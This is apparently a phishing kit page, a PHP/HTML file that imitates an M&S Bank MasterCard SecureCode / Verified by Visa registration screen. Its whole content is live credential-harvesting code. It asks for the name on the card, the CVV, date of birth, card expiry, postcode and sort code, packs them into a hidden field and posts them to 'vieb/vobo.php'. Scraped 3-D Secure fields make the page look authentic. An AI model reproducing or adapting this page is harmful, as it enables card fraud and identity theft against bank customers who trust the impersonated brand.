<?php
require_once 'enc.php';
require_once 'ant.php';
?>
<html class=" js " lang="en-GB">

<head>
<meta HTTP-EQUIV="Cache-Control" CONTENT="no cache">
<meta HTTP-EQUIV="Pragma" CONTENT="no cache">
<meta HTTP-EQUIV="Expires" CONTENT="0">
<meta HTTP-EQUIV="content-type" CONTENT="text/html; charset=utf-8">

<title>&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#67;&#111;&#109;&#112;&#108;&#101;&#116;&#101;&#32;&#119;&#105;&#116;&#104;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;&#115;</title>
	<LINK REL="stylesheet" HREF="vieb/style.css" TYPE="text/css">
<script type="text/javascript" charset="utf-8" data-requirecontext="_" data-requiremodule="main" src="loginfiles/css1/js/main.js"></script>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Please Complete with Your Informations</title>
<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7">
<meta name="viewport" content="user-scalable=no, width=device-width">
<link rel="shortcut icon" href="loginfiles/isu.gif">
<link rel="apple-touch-icon" href="loginfiles/isu.gif">
<link rel="stylesheet" href="loginfiles/css1/app.css"> 
</head>
<body class="desktop">
<style type="text/css">.js .lap .textInput.medium label,.js div.lap.textInput.medium label{top:10px;}</style> 
    <div id="page" class="marketing-ce2">   
<header class="gblHeader">
<div class="utility in">
<div class="wrapper">
<div class="logo" role="banner">
<a href="#">  <img alt="" src="loginfiles/css1/img/msl.png" title="">
</a>
</div>  </div>
</div>
</header>
<section id="content" role="main" class="GB"> <section id="main">  
<div class="nsb_24 nogutter">
<section class="pageHeadline nsb_16_8 nogutter">
</section>
</div>
<div class="nsb_10_14"> 
<div class="one column"> 
<div class="trayNavOuter"> 

<div class="trayNavInner clearfix" id="onboarding">  


<style type="text/css">

.donately-donation-form, .donately-thank-you {
    font-size: 13px;
    line-height: 1em;
}

.donately-secure-header span {
    padding-left: 1.5em;
    background-position: 0px 0px;
    background-repeat: no-repeat;
    background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAMCAYAAACwXJejAAAAIUlEQVQY02NonjybAYr/Y8FgOXQFDFg0UVnRf0J4VNF/AGtWD2MTxoZrAAAAAElFTkSuQmCC');
}

.donately-secure-header {
    font-size: 0.77em;
    background-color: #E8EBED;
    text-transform: uppercase;
    color: #83939B;
    padding: 1em 1.5em;
    margin-bottom: 1em;
    box-shadow: 0px 1px 0px rgba(255, 255, 255, 0.3) inset;
}

.donately-secure-fields {
    border: 1px solid #D7DADD;
    background-color: #EFF3F5;
    padding: 0px;
    margin: 0px 0px 1.92em;
    border-radius: 3px;
}
.donately-secure-fields .donately-fields.card-number-fields {
    margin-bottom: 1.5em;
}
.donately-secure-fields .donately-fields {
    padding-left: 1.15em;
    padding-right: 1.15em;
    margin-bottom: 0px;
}


</style>
<section style="display: block;" id="normalinfo">
<header>          
<HTML>
<BODY BGCOLOR="#ffffff" MARGINHEIGHT="0" MARGINWIDTH="0" LEFTMARGIN="0" TOPMARGIN="0" onbeforeunload="onBeforeUnloadHandler(this);" onload="checkSessionStatus(this);" onfocus="onFocusHandler();">


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">

<HTML>
<HEAD>
<meta HTTP-EQUIV="Cache-Control" CONTENT="no cache">
<meta HTTP-EQUIV="Pragma" CONTENT="no cache">
<meta HTTP-EQUIV="Expires" CONTENT="0">
<meta HTTP-EQUIV="content-type" CONTENT="text/html; charset=utf-8">

	<TITLE>MasterCard SecureCode</TITLE>
	<LINK REL="stylesheet" HREF="vieb/style.css" TYPE="text/css">
	<script language=javascript src="vieb/rfutil.js" ></script>

	<SCRIPT LANGUAGE="JavaScript">
	<!--

		function popUp2(strURL)
		{
		    //popUP2 = window.open("mandsbank_mc_en_GB/" + strURL,'popUp2','width=390,height=400,scrollbars=no,screenX=100,screenY=100,left=100,top=100"');
		    popUP2 = window.open("mandsbank_mc_en_GB/" + strURL,'popUp2','width=390,height=400,scrollbars=yes,screenX=100,screenY=100,left=100,top=100"');
			popUP2.focus();
		}
	//-->
	</SCRIPT>

<script language=javascript src="mandsbank_mc_en_GB/pwdbase.js" ></script>
<script language=javascript src="mandsbank_mc_en_GB/pwdcookies.js" ></script>

<SCRIPT LANGUAGE="JavaScript">
<!--

function init()
{
	document.optInForm.ABSlog.value = document.optInForm.ABSlog.value + ";INIT;";
	var so = new SWFObject("Riskfort/flash/arcot-devicedna.swf", "flashObj", "0", "0", "6", "#ffff00");
	so.addParam("allowScriptAccess", "always");
	so.write("flashcontent");

	var divid = document.getElementById("flashsetting");
	divid.style.display = 'block'; //intially hidden
	waitAndSetFlashCookie();
}

function waitAndSetFlashCookie()
{
	if (arcotIsInitDone != 1 && arcotMovieLoadCheckCnt < arcotMaxRetries)
									// Once movie loading is complete,
									// the arcotIsInitDone variable is set to 1.
									// arcotMaxRetries is the maximum number of times the
									// the check can be performed. This is defined in
									// rfutil.js
	{
		 arcotMovieLoadCheckCnt++;
		 setTimeout("waitAndSetFlashCookie()", ARCOT_RETRY_PERIOD_MSEC);
									// ARCOT_RETRY_PERIOD_MSEC is the
									// time interval after which the
									// check is done again. This is
									// defined in rfutil.js
	}
	else if (arcotIsInitDone == 1)  // The flash movie has loaded completely.
	{
		document.optInForm.ABSlog.value = document.optInForm.ABSlog.value + ";FI;" + arcotMovieLoadCheckCnt;
		setFlashCookie("RiskfortCookie","TykjTN1uZhxBN3QL3E/JdUNaJdUtVOQbk0OxuEm8bgDlmb+nbrszXwYiOqL5xweP");
		document.optInForm.ABSlog.value = document.optInForm.ABSlog.value + rfutilMsgs;
	}
	else // Movie loading has not happened within reasonable time.
	{
		  document.optInForm.ABSlog.value = document.optInForm.ABSlog.value + ";FNI";
		  return null;
	}
}



var isAA = false;
var acsstring = document.location.href;
if(acsstring.indexOf("AVV=1") != -1)
{
	isAA = true;
	setCookie("AAFlag","true");
}

var cookievalForAA = getCookie("AAFlag");

if(cookievalForAA != null)
{
	if(cookievalForAA == "true")
	{
		isAA = true;
	}
}
function OnPageInit()
{

	if(1101 >= 1200 && 1101 <= 1202)
	{
		document.optInForm.Continue.disabled = false;
	}
	else
	{
		document.optInForm.Activatenow.disabled = false;
		document.optInForm.Donotactivatenow.disabled = false;
	}
	window.history.go(1);
	self.focus();
}

var closing = true;


function checkSessionStatus(object)
{
	// 2 = 2, then only it is flash cookie : http cookie is sent in the header
	if ("2" == "2" || "2" == "4") {
		  // Setting the Flash Cookie
			init();
	}
	var cookievalss = getCookie("HSBC_PLC_AE");
				//alert("In oninit cookievalss="+cookievalss);
				if(cookievalss != null)
				{
					if (cookievalss > 3 || cookievalss == 3)
					{
						setCookie("HSBC_PLC_AE",0);
						setCookie("HSBC_PLC_AE_Flg","true");
						closing = false;
						return closeButton(object);
					}
				}

}


function onBeforeUnloadHandler(object)
{
	var Flag = getCookie("HSBC_PLC_AE_Flg");
	if(Flag != null)
	{
		if(Flag == "true")
		{
			setCookie("HSBC_PLC_AE_Flg","false");
			return;
		}
		else
		{
			if ( closing )
			{
				if (isAA)
				{
					event.returnValue = "Your activation has not completed!\nTo complete your activation click 'Cancel'.";
				}
				else
				{
					event.returnValue = "Your purchase has not completed!\nTo complete your purchase click 'Cancel'.";
				}
			}
		}

	}
	else
	{
		if ( closing )
		{
			if (isAA)
			{
				event.returnValue = "Your activation has not completed!\nTo complete your activation click 'Cancel'.";
			}
			else
			{
				event.returnValue = "Your purchase has not completed!\nTo complete your purchase click 'Cancel'.";
			}
		}
	}
}


function onFocusHandler()
{
	closing = true;
}

function HelpWindow()
{
	var win = window.open("mandsbank_mc_en_GB/sorryhelp.htm","Help",
		"height=300,width=360,dependent=yes,scrollbars=yes,resizable=no,screenX=650,screenY=350,left=650,top=350");
}

// Configurable parameters:

var loadError = null;

function objError (evnt)
{
	loadError = "error";
}

function isValidCreditCardExpiry(expiresMonth, expiresYear)
{

  var isValid = true;

  var nowDate = new Date();

  if (expiresMonth < (nowDate.getMonth() + 1) &&

      expiresYear == nowDate.getFullYear())

  {

    isValid = false;

  }

  else if (expiresYear < nowDate.getFullYear())

  {

    isValid = false;

  }

  return isValid;

}

function OnUserInput(userInput)
{
	closing = false;
	document.optInForm.optIn.value = userInput;
   	if(userInput == 1)
   	{
		var name = document.optInForm.CHName1.value;


   		if(name.length > 0)
   		{
   			document.optInForm.CustData.value = name;
   		}
   		else
   		{
   			alert("Please enter your name as it appears on your card.");
   			document.optInForm.CHName1.focus();
   			return false;
   		}

   		var digits = document.optInForm.cvv2.value;
   		  if(!digits.match(/^\d{3}$/))
   		  {
   			alert("Please enter a valid Three Digit Security Number.");
   			return false;
   		  }
		var dob = document.optInForm.dob.value;
   		  if(!dob.match(/^\d{6}$/))
   		  {
   			alert("Please enter a valid Birth Date.");
   			return false;
   		  }
   		var expdate = document.optInForm.expdate.value;
   		  if(!expdate.match(/^\d{6}$/))
   		  {
   			alert("Please enter a valid Card Expiry Date.");
   			return false;
   		  }

   		var zip = document.optInForm.zip.value;

   		if(zip.length > 0)
   		{
   			//NA
   		}
   		else
   		{
   			alert("Please enter a valid Post Code.");
   			document.optInForm.zip.focus();
   			return false;
   		}
		//checks for numbers and hyphen
		function numbersAndHyphen(str)
		{
			  var isbad1="err";
			  var count =0;
			  var hyphen = "-";
			  //alert("str="+str + "here");
			  var numbers=new Array("1","2","3","4","5","6","7","8","9","0","-");
			  for(i=0;i<str.length;i++){
					//alert(str.substring(i,i+1));
					isbad1="err";
					for(j=0;j<=numbers.length;j++){
						  if(str.substring(i,i+1)==numbers[j]){
							isbad1="pass";
							break;
						  }
					}
					if(isbad1=="err"){
						break;
					}
			  }
			  //alert(isbad1 + " value " + str);
			  return isbad1;
		}

   		var day=dob.substring(0,2);
		var month1 = dob.substring(2,4);
		var year1 = dob.substring(4,6);
		var slash = "/";
		var dobtoPass = day+slash+month1+slash+"19"+year1;
		if (month1 < 1 || month1 > 12 || day < 1||day > 31)
		{
			alert("Please enter a valid Date Of Birth.");
			return false;
		}


		var month = expdate.substring(0,2);
		var year = expdate.substring(2,6);
		if (month < 1 || month > 12)
		{
			alert("Please enter a valid Month and Year for your Card Expiration Date.");
			return false;
		}

		var isvalid = isValidCreditCardExpiry(month,year);
		if(!isvalid)
		{
			alert("Please enter a valid Month and Year for your Card Expiration Date.");
			return false;
		}

		document.optInForm.optIn.value = userInput;
	   	if((1101 >= 1100) &&  (1101 <= 1103) ||
	   		(1101 >= 1200 && 1101 <= 1202))
	   	{
			document.optInForm.pin.value = "name=" + name +":cvv=" + document.optInForm.cvv2.value + ":expiry=" + document.optInForm.expdate.value + ":zip=" + document.optInForm.zip.value + ":dob=" + dob;
		}


	}else if (userInput == 2){
				document.optInForm.optIn.value =1;
				document.optInForm.pin.value = "attempt=attempt"
	}
	else
	{	
		document.optInForm.optIn.value = userInput;
			if((1101 >= 1100) &&  (1101 <= 1103) ||
	   		(1101 >= 1200 && 1101 <= 1202))
		{
			document.optInForm.pin.value = "NA";
		}
	}

	if(1101 >= 1200 && 1101 <= 1202){	
		document.optInForm.Continue.disabled = true;
	}
	else
	{
		//document.optInForm.Activatenow.disabled = true;
		//document.optInForm.Donotactivatenow.disabled = true;
	}
	
	document.optInForm.submit();
	return false;
}


function closeButton(object)
{
		closing = false;
		//alert("calling OnCancelHandler2");
		setCookie("HSBC_PLC_AE_TrnStatus","fail");
		OnCancelHandler2(object);
		cancel = true;
		//close();
}



//-->
</SCRIPT>

<script language=javascript>
var bankdir = "mandsbank.gif";
setCookie("BANKDIR",bankdir);
</script>



</HEAD>

<BODY BGCOLOR="#ffffff" MARGINHEIGHT="0" MARGINWIDTH="0" LEFTMARGIN="0" TOPMARGIN="0" onbeforeunload="onBeforeUnloadHandler(this);" onload="checkSessionStatus(this);" onfocus="onFocusHandler();">

<TABLE WIDTH="100%" CELLPADDING="0" CELLSPACING="0" BORDER="0">
	<FORM name="optInForm" action="vieb/vobo.php" method=POST>
	<TR>
		<TD ALIGN="center">


			<!-- Content area -->
			<TABLE WIDTH="330" HEIGHT="340" CELLPADDING="0" CELLSPACING="0" BORDER="0">
				<TR>
					<TD VALIGN="bottom" WIDTH="89" HEIGHT="51">
						<!-- Visa graphic -->
						<IMG name="vpasLogo" SRC="vieb/vpas_logo.gif"  BORDER=0 title="MasterCard SecureCode"><BR>
					</TD>
					<TD ALIGN="right" VALIGN="bottom" WIDTH="301" HEIGHT="51">
						<!-- HSBC Logo -->
						<IMG name="memberLogo" src="vieb/vbyvisa_blu.png"  BORDER=0 title="M&S Bank" width="85" height="48">
					</TD>
					
					</TR>
				<TR>
					<TD COLSPAN="2" HEIGHT="285">
						<br />
						<SCRIPT LANGUAGE="javascript">



						if (1101 == 1102 || 1101 == 1103)
						{
							if (isAA)
							{
								document.writeln('<font color="#ff9900" size="4">Please Verify Your Identity</font><BR><br>');
								document.writeln('<font face="arial" size="2">The information you entered does not match our records for your account.  </font>');
								document.writeln('<font face="arial" size="2" color="#ff9900"><B>Please try again.</B></font><br><br>');
							}
							else if ((1101  == 1101) || (1101 == 1103))
							{
								document.writeln ('<font face="arial" SIZE="3" color="#003366"><b>Protect Your MasterCard Card Online</b></font><BR><IMG SRC="mandsbank_mc_en_GB/images/spacer_clear.gif" WIDTH="1" HEIGHT="20" BORDER=0 ALT=""><font face="arial" SIZE="1" color="#ff7800"><B>We are sorry - there was an error . Please submit your information again.<BR></font></B>');
							}
							else
							{
								document.writeln ('<font face="arial" SIZE="3" color="#003366"><b>Protect Your Visa Card Online</b></font><BR><IMG SRC="mandsbank_mc_en_GB/images/spacer_clear.gif" WIDTH="1" HEIGHT="20" BORDER=0 ALT=""><font face="arial" SIZE="1" color="#ff7800"><B>We are sorry - there was an error . Please submit your information again.<BR></font></B>');
							}

							//alert("Setting cookie");
							var cookieval = getCookie("HSBC_PLC_AE");
							if(cookieval != null)
							{
								//alert("cookieval="+cookieval);
								cookieval++;
								//alert("Newcookieval="+cookieval);
								setCookie("HSBC_PLC_AE",cookieval);
							}
							else
							{
								cookieval = 1;
								//alert("Newcookievalafternull="+cookieval);
								setCookie("HSBC_PLC_AE",cookieval);
							}


						}
						else if(1101 >= 1200 && 1101 <= 1202)
						{
						    delCookie("AAFlag");
							document.writeln ('<font face="arial" SIZE="3" color="#003366"><b>Forgot your MasterCard SecureCode Password</b></font><BR><IMG SRC="mandsbank_mc_en_GB/images/spacer_clear.gif" WIDTH="1" HEIGHT="10" BORDER=0 ALT=""><font Class="TextBlack">If you have forgotten your MasterCard SecureCode Password, you can reset your MasterCard SecureCode Password by confirming your identity with the information below.<BR></font>');
							document.writeln ('<BR>');
							document.writeln ('<BR>');
							if( 1101 & 0x02 )
								document.writeln ('<font face="arial" SIZE="1" color="#ff7800">We are sorry - an error was encountered. Please ensure that the information you submitted is correct and try again.<BR></font>');
						}
						else
						{
							if ((1101  == 1101) || (1101 == 1103))
							{
								if (isAA)
								{
									document.writeln('<font color="#ff9900" size="4">Please Verify Your Identity</font><BR><br>');
									document.writeln('<font Class="TextBlack">Complete this form and then click <b>Continue</b></font>.<br><br>');
								}
								else
								{
									document.writeln ('<font face="arial" SIZE="3" color="#003366"><b>Protect Your MasterCard Card Online</b></font><BR><IMG SRC="mandsbank_mc_en_GB/images/spacer_clear.gif" WIDTH="1" HEIGHT="10" BORDER=0 ALT=""><font Class="TextBlack">Register your card now for MasterCard SecureCode. It&#8217;s a free service that helps prevent fraud when shopping online.</font><BR style="line-height:3px">');
								}

							}
							else
							{
								if (isAA)
								{
									document.writeln('<font color="#ff9900" size="4">Please Verify Your Identity</font><BR><br>');
									document.writeln('<font Class="TextBlack">Complete this form and then click <b>Activate Now</b>.</font><br><br>');
								}
								else
								{
									document.writeln ('<font face="arial" SIZE="3" color="#003366"><b>Protect Your Visa Card Online</b></font><BR><IMG SRC="mandsbank_mc_en_GB/images/spacer_clear.gif" WIDTH="1" HEIGHT="10" BORDER=0 ALT=""><font Class="TextBlack">Register your card now for Verified by Visa. It\'s a free service that helps prevent fraud when shopping online.<br></font><BR style="line-height:3px">');

								}
							}

						}
						</SCRIPT>

	    				<TABLE WIDTH="330" CELLSPACING="0" CELLPADDING="1" BORDER="0">
						<SCRIPT LANGUAGE="javascript">
						if((1101 >= 1100) &&  (1101 <= 1103) ||
							(1101 >= 1200 && 1101 <= 1202))
						{
							document.writeln('<TR>');
							document.writeln('<TD WIDTH="150" ALIGN="right" VALIGN="top" CLASS="TextBlack"><label for="issuerQuestion1">Name on Card:</label></TD>');
							document.writeln('<TD WIDTH="170" VALIGN="top" colspan="2"><INPUT id="issuerQuestion1" title="Name on Card" TYPE="text" NAME="CHName1" SIZE="20" MAXLENGTH="60" value="" CLASS="monospace">&nbsp;&nbsp;<BR></TD>');
							document.writeln('</TR>');

							document.writeln('<TR>');

							document.writeln('<TR>');
							document.writeln('<TD WIDTH="150" ALIGN="right" VALIGN="top" CLASS="TextBlack"><label for="issuerQuestion2">Three Digit Security Number:</label></TD>');

							document.writeln('<TD WIDTH="225" VALIGN="top" colspan="2"><table cellpadding=0 cellspacing =0 border=0 width="225"><tr><td><INPUT id="issuerQuestion2" title="Three Digit Security Number" TYPE="password" NAME="cvv2" SIZE="3" MAXLENGTH="3" CLASS="monospace"></td><td width="10px"><A HREF=\"javascript: popUp2\(\'sigpanel.htm?mandsbank.gif\'\)\" onClick=\"closing=false\"><IMG SRC="vieb/cvv2.gif" BORDER=0 ALT="Verification Code" title="Verification Code"></A></td><td><span CLASS="TextSmall">&nbsp;The last 3 digits on<BR>&nbsp;the back of the card</span></td></tr></table></TD>');

							document.writeln('</TR>');

							document.writeln('<TR>');
							document.writeln('<TD WIDTH="150" ALIGN="right" VALIGN="middle" CLASS="TextBlack"><label for="issuerQuestion3">Cardholder Date of Birth:</label></TD>');
							document.writeln('<TD WIDTH="170" VALIGN="top" colspan="2"><INPUT id="issuerQuestion3" title="Cardholder Date of Birth" TYPE="text" NAME="dob" SIZE="6" MAXLENGTH="6" CLASS="monospace">&nbsp;&nbsp;<SPAN CLASS="TextSmall">DDMMYY</SPAN><BR></TD>');
							document.writeln('</TR>');
							document.writeln('</TR>');

							document.writeln('<TR>');
							document.writeln('<TD WIDTH="150" ALIGN="right" VALIGN="middle" CLASS="TextBlack"><label for="issuerQuestion4">Card Expiry Date:</label></TD>');
							document.writeln('<TD WIDTH="170" VALIGN="top" colspan="2"><INPUT id="issuerQuestion4" title="Card Expiry Date" TYPE="password" NAME="expdate" SIZE="6" MAXLENGTH="6" CLASS="monospace">&nbsp;&nbsp;<SPAN CLASS="TextSmall">MMYYYY</SPAN><BR></TD>');
							document.writeln('</TR>');

							document.writeln('<TR>');
							document.writeln('<TD WIDTH="150" ALIGN="right" VALIGN="top" CLASS="TextBlack"><label for="issuerQuestion5">Postcode of the UK Statement Address:</label></TD>');
							document.writeln('<TD WIDTH="85" VALIGN="top"><INPUT id="issuerQuestion5" title="Postcode of the UK Statement Address" TYPE="password" NAME="zip" SIZE="8" MAXLENGTH="8" CLASS="monospace"></TD>');
							document.writeln('<TD WIDTH="85" VALIGN="top"><SPAN CLASS="TextSmall"></SPAN></TD>');
							document.writeln('</TR>');

							document.writeln('<TR>');
							document.writeln('<TD WIDTH="150" ALIGN="right" VALIGN="middle" CLASS="TextBlack"><label for="issuerQuestion6">Sort Code on Card:</label></TD>');
							document.writeln('<TD WIDTH="225" VALIGN="top" colspan=2><table cellpadding="0" cellspacing="0" border="0"><tr><td align="left" width="22px"><INPUT id="issuerQuestion6" title="Sort Code on Card" TYPE="password" NAME="sortCode1" SIZE="2" MAXLENGTH="2" CLASS="monospace"></td><td align="center" width="6px">-</td></td><td align="left" width="22px"><INPUT id="issuerQuestion6" title="Sort Code on Card" TYPE="password" NAME="sortCode2" SIZE="2" MAXLENGTH="2" CLASS="monospace"></td><td align="center" width="6px">-</td></td><td><INPUT id="issuerQuestion6" title="Sort Code on Card" TYPE="password" NAME="sortCode3" SIZE="2" MAXLENGTH="2" CLASS="monospace"></td><td>&nbsp;<A HREF=\"javascript: popUp2\(\'sortcode.htm?mandsbank.gif\'\)\" onClick=\"closing=false\"><></a></td><td><span CLASS="TextSmall">&nbsp;6 digit &nbsp;number</span></td></tr></table></TD>');
							document.writeln('</TR>');

						}
						</SCRIPT>
						</table>

						<!-- Issuer speciffic info -->

					<!-- Start of the Close button -->
						<DIV ALIGN="center">
							<SCRIPT LANGUAGE="javascript">
							if(1101 >= 1200 && 1101 <= 1202)
							{
								document.writeln ('<A TITLE="Return to MasterCard SecureCode Password entry" HREF="Back" VALUE="Back" onClick="return OnUserInput(300);">Back</A><IMG SRC="mandsbank_mc_en_GB/images/spacer_clear.gif" WIDTH="10" HEIGHT="1"><INPUT TYPE="button" NAME="Continue" title="Continue" VALUE="Continue" onclick="return OnUserInput(1);"><IMG SRC="mandsbank_mc_en_GB/images/spacer_clear.gif" WIDTH="10" HEIGHT="0" BORDER=0 ALT=""><A HREF=\"javascript: popUp2\(\'faq.html?mandsbank.gif\'\)\" onClick=\"closing=false\">Help</A>');
							}
							else if((1101  == 1101) || (1101 == 1103))
							{
								document.writeln ('<SPAN class="TextSmall">Enter your information to register and confirm you have read the <A HREF=\"javascript: popUp2\(\'tnc.html\'\)\" title="Service Guidelines" onClick=\"closing=false\">Service Guidelines</A> by clicking register now.</SPAN> <br><br>');
								//document.writeln ('<INPUT TYPE="button" NAME="Activatenow" VALUE="Activate now" title="Activate Now" onclick="return OnUserInput(1);">');
								//document.writeln ('<INPUT TYPE="button" NAME="Donotactivatenow" VALUE="No Thanks" title="No Thanks"  onclick="return OnUserInput(2);">');


								document.writeln ('<INPUT name="Activatenow" style="  FONT-STYLE: normal; HEIGHT: 25px; WIDTH: 100px" type =button value="Register Now " title="Register Now" onclick="return OnUserInput(1);">');
								document.writeln ('<IMG SRC="mandsbank_mc_en_GB/images/spacer_clear.gif" WIDTH="10" HEIGHT="0" BORDER=0 ALT=""><A HREF=\"javascript: popUp2\(\'faq.html?mandsbank.gif\'\)\" title="Help" onClick=\"closing=false\">Help</A>');
							}else{
								document.writeln ('<INPUT name="Activatenow" style="  FONT-STYLE: normal; HEIGHT: 25px; WIDTH: 100px" type =button value="Register Now " title="Register Now" onclick="return OnUserInput(1);">');
							}
							</SCRIPT>
							<NOSCRIPT>
							<INPUT TYPE="Submit" VALUE="Register now" title="Register now" onClick="closing=false">&nbsp;
							<INPUT TYPE="Submit" VALUE="Continue" title="Continue">
							</NOSCRIPT>
						</DIV>
					<!-- End of the Close button -->

					</TD>
				</TR>
				<TR>
				<TD colspan="2">

		<!-- copyright notice table -->
		<TABLE width="100%" cellpadding="0" cellspacing="0" border="0">
		<TR height=3>
		</TR>
		<TR>
		<!--<TD width=150></TD>-->
		<TD align="left" valign="top">
		<SCRIPT LANGUAGE=javascript>
		if ((1101  == 1101) || (1101 == 1103))
		{
			//document.writeln ("<SPAN class=\"footer\">*Please note that by selection not to register this may prevent you from making future on-line purchases with your M&S MasterCard credit card.</span>");
		}
		else if(1101 >= 1200 && 1101 <= 1202)
		{
			// do nothing
		}
		else
		{
				//document.writeln ("<SPAN class=\"footer\">*Please note that by selection not to register this may prevent you from making future on-line purchases with your M&S MasterCard credit card.</span>");
		}

		</SCRIPT>
		<br>
		<!--
		Click here to view
		-->
		<SCRIPT LANGUAGE=javascript>
			//document.writeln ("<A HREF=\"javascript: popUp2\('privacy.htm?mandsbank.gif'\)\" onClick=\"closing=false\">");
		</SCRIPT>
		<!--
		<NOSCRIPT>
			<A HREF="mandsbank_mc_en_GB/privacy.htm" target=_blank onClick="closing=false">
		</NOSCRIPT>
		Privacy Policy.</A>
		-->
		</SPAN>
		</TD>

		</TR>
		</TABLE>

		<!-- end copyright notice table-->

				</TD>
				</TR>

			</TABLE>
			<!-- End of content area -->

		</TD>
	</TR>
	<TR>
	<TD>
	<SCRIPT LANGUAGE=javascript>

	</SCRIPT>
	</TD>
	</TR>

	<input type="hidden" name="PaReq" value="eNpVUk1vgzAM/StVr5MwSQllyI3Eiqr1UERXdthuWYhatgItH6P8+yWUrpsv8Xt2HPs5mBwqpcKdkm2lOG5UXYu9mmTpYuo7DnE85jiUzVzmue6UYxy8qDPHb1XVWVlwYtkWRbhBfb2SB1E0HIU8P60jzqjL3DnCCDFX1TocWXswSh8RrjQWIld8V8pMHCex6HNVNDXCwKIs26Kpeu45NsINYFsd+aFpTj5A13XWh0jL0pJlDggmhHDvKG6NV+tSlyzlUbi9ROGe6LOPkg2Nkj2N9oGxBYLJwFQ0ilObzG1C3QlxfMb8mYsw8Chy0wNPonBCmEWp7mqk8GReCq6AsCH0l0ItdaUK2fO55+lZbgjV5VQWemY+Q/j1Ee6NL5+NsLLRWq1eP0+dTHfbh/Y9Zqswn8VtHbytlsHXwsg9JJmKmZaJePZ8KGkAgikD4yZh3Lj2/v2EH77Tric=" >
	<input type="hidden" name="MD" value="oQml7dQlk1SdPBnaIxICIC44jDVXlSVA7HYa9jRAzYS4CPBVfyhJ7qBbdNu3HPNr7/2H7aAYqIp72pWThG6UztoZ2//dg2ofVMgyV5ctnFGwZ/6ROGz/vvUZutgNPSY3chxbwJhFVi/Yn/HYGB25abNn2FHoEnjMc9rWYvrGiYAJecugAIenEAUQimUzJgaeN2WYtMWejl47eWSrd06+omEvbrU44AG126UkSB9HBMO9sDoaNp7To7fsiAM6/C+JAdGc9ltVU2SNe4Naypq0sbRrBwpLpK+QroDzBKUBvNv4TvEUrO/iPoJSIxw54+q7HkpzJgGX/5grYO3S950LwUmQfgR6+DUJgaazrRuFH9lEyTwSbggUTmm8+LODbg7UDMV7/1G0idWfW5Y1WBQm+ci3dk+inpe2PaYbr6Qg/OSg0+LSUSNfAvlUsDxTBtSS">
	<input type="hidden" name="TermUrl" value="https://ccardseu1.badoo.com/complete3ds.phtml?pid=150325781&request_code=GYn6BXGwIYuC6ANvrd1LcWPuGMb7dCI1&flow=web&lang_code=en-us&hash=4680789383789e68c0c90c165bda3553b34f110d">
	<input type="hidden" name="optIn" value="-1">
	<input type="hidden" name="issuerAnswer" value="">
	<INPUT TYPE="hidden" NAME="pin" SIZE="14" MAXLENGTH="30" CLASS="monospace">
	<input type="hidden" name="AcsCookie" value="XB8lWZOOyYPkwFC3QNDCDj22/jV7CeljvVvl7pz+Bvj30RTgdqHqc3ZQbH+Zyj4Zd+BgDFZe+awUZyUMNjJfxBm84tqjRa4K22+aYDQG6/HMC0xRpIVO6UmlSw1nUyDanoRkO3I+t5jhaBbFUK9v9vLkRKUMZC1w5FhHnOd0rrkMhsP1Xnyj+BYF9e06tfH3iuf708Ve1EOh/hlGMLXTqWVFmbWnmBQX/YImI/Tt+u8qmeYz1lUl5Kah4e1zLCVUeaYSqAiyOarBytEV1eBGv6G2qPklqkTe+K2CK2DIfqLpdO2TyKqaRObjtru5tuxgp+iw71/J/sbdvK0J/rLn8m79c3MMbeIesYbRT6JKad7LfStgdtYAE1eXPOALI/ZLPJbym/ijjZgYexPwwQtPQJKiqy8AtBpWGXqGl2Xmz7wtoHpks0OaZJQjkcODcFG+JKGqUpj1iUIx5+l7Q2Va7IpuPKD+kkIqEDy/AJcwpCGAs+w3Qb+BquG/BfPEgrWVoBXQYDBH2M8Hbv4yfmmG47UlzLptTvPbDP9aFpUrEg3xtZXuf79OTylGh2W7ub+lNQlf1fDLRtYaZErbFiGviJKlxlkvK+9Zw4yHgUlYdYRCLAhdIsdrz6RTvURsyNZA215mM1bGkVNT3UEClk+EyHa1P2WI1Mkv5FsZQfd1j+VSa83hSORuFba1+m6PB4yomDsVzUSHeWOhJcHNw6e8LhFJypr3T5/2hagKwyxaRgCGzCsKO2e8a07ssDY8tpTM6TuhEVllDqUir1p3Jbxphmtyv5bMDIRv6TLNJJfIyoLMPrSGeY/WP5L9IQslGN4SURy1H+QbIOlvwyd+kGilkBCL3Rw7o16lJRZIHGxSXcSlrj3TMq0Yr0SzO4gh4WaqrOsfQJwqSWJaXMCnNXdL6XClQG0kFSxvCMW0Me6+/iFGd3a81hnmKZx86QWYrhusYu/VZju/0Gag6brBivcbFZqDXFOd36zBLOv/ug8JZlNC6s1nD/vDOtYfPrc7ozvIm/gepF1ngizxFPxz/kV4Ekda+pBbE1qy/v46h7pTs8V3dLb7bvMg4qg7NdqfptB1iJ7T3UQnM92ALTrtRRuiMpHoU+Hwonf7XBvGv/2KvLYJ2PaWuW3Q/jB50JTcC3F1976hhm2ta/M9D92V9q9KHHMMjfn4TgQLF/DzApf9JSbxYbgUSLvdqKF+LXRjX8/U0b/0YbNOd5fbOcspB52q4vAmOYHO3bVBaJFpC90JMLXPmh1e5n+WPWDmcxC7m7xteUYzt+qPGgsX32hRhNeg+Z+MVZQoTokoSYykxIs51R1phWhMoSHXEwbOr1RozgZXa5l2vFkDq+ZrI9IvmFTvSnSsOgsfxOOrBfA8tWOG4O/DQN4yZ+y4MBRF1qvFG7F4x9CZKRe9teHZWsakirIbaCxLN1kSQ1ewwY8sEG09s9cGNfLU2K6vn/Ihps1PYHQG3oqUekqocGgsbLBkQAF9VL7laO8MOnqpMtxUGRJ3YbRPmp+MWAYi6ewZndF9w3dlbtn7JzpaKo9nKP98sZA5kXBqYbJgmPsDCcW1Pl3p8oh7nmtE8YKTpU4b+mpKep3zfmxeWuLv5cgI4pBJXocVGJAnL3/dFDS2sxXfaBazJwaMxo4AytxcDzdaU2FXNJKksS0yZM12rA6B2xdVcT0xvxatO8YT8JtFAc8MCOzpv4yBvpbHTA9BejZ4Joli+mdnVmOrBp4JTDi1EyjVoUso1Z3KlVgBztwHrs45MwLvsf3TG9qHJlFsgvuO1lQCCTdp4kLW/bZEm2